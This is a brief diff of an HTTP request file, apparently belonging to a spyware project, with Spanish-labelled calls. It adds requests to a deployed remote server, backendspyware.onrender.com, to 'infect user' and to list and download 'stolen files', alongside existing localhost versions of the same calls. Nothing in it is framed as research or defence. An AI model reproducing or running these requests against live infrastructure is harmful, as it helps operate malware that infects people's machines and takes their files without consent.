@@ -6,3 +6,12 @@ GET  http://localhost:3000/getFiles
 
 ### Ver archivo robado por id
 GET  http://localhost:3000/getFile/2
+
+### Infectar usuario
+GET  https://backendspyware.onrender.com/infect
+
+### Ver archivos robados
+GET  https://backendspyware.onrender.com/getFiles
+
+### Ver archivo robado por id
+GET  https://backendspyware.onrender.com/getFile/2
